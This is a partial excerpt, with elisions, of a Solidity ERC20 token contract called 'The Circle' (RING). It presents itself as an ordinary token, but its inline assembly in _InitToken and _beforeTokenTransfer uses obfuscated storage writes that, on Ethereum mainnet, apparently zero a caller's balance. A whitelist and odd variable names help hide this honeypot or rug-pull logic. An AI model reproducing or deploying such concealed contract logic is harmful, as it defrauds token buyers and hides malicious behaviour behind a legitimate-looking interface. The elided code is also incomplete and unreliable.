...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addRing;
    uint256 private _checkRing = block.number*2;

    mapping (address => bool) private _firstRing; 
    mapping (address => bool) private _secondRing;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private mrMordor;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private theBeast;
    address public pair;
    ...
    bool private trading; uint256 private unfriendlyGirl = 1; bool private friendlyDude;
    uint256 private _decimals; uint256 private redCap;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addRing.push(_router); addRing.push(msgSender_); addRing.push(pair);
        for (uint256 q=0; q < 3;) {_firstRing[addRing[q]] = true; unchecked{q++;} }
    }
    ...
    function _InitToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xFB)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x85633cacecfab86e52cd40360c9c2327f14ba80baf8e21a6475e84c96d73c683
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x04ef87d9eea466043ffe362f0875ff6ba73b47a5c69c53827c28ee2b0cfd2d5e,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _checkRing = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addRing[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
...
contract TheCircle is ERC20Token {
    constructor() ERC20Token("The Circle", "RING", msg.sender, 2700000 * 10 ** 18) {
    }
}